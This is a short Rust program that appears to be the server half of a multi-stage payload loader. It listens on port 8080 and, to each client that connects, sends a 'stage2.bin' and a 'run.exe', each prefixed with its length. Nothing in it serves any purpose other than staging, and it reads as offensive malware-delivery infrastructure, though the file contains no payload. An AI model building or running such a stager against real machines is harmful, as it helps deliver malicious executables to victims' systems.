use std::{io::Write, net::TcpListener, path::PathBuf, time::Duration};

use clap::{command, Parser};

#[derive(Parser, Debug)]
#[command(version, about, long_about = None)]
struct Args {
    /// Path to the stage2.bin to deliver
    #[arg(short, long)]
    stage2: PathBuf,

    /// Path to the run.exe to deliver
    #[arg(short, long)]
    run: PathBuf,
}

fn main() -> std::io::Result<()> {
    let args = Args::parse();

    let listener = TcpListener::bind("0.0.0.0:8080").unwrap();

    if !args.stage2.exists() {
        eprintln!("[WARN] Provided stage2 does not exist: {:?}", &args.stage2);
    }

    if !args.run.exists() {
        eprintln!("[WARN] Provided run.exe does not exist: {:?}", &args.run);
    }

    for stream in listener.incoming() {
        println!("Connection established!");

        let stage2 = std::fs::read(&args.stage2)?;
        let run = std::fs::read(&args.run)?;
        let mut stream = stream.unwrap();

        println!("Sending stage1 len");
        stream.write_all(&(stage2.len() as u32).to_be_bytes())?;
        println!("Sending stage1");
        stream.write_all(&stage2)?;

        println!("Sending run.exe len");
        stream.write_all(&(run.len() as u32).to_be_bytes())?;
        println!("Sending run.exe");
        stream.write_all(&run)?;

        std::thread::sleep(Duration::from_secs(10));

        println!("Waiting for new connection...")
    }

    Ok(())
}
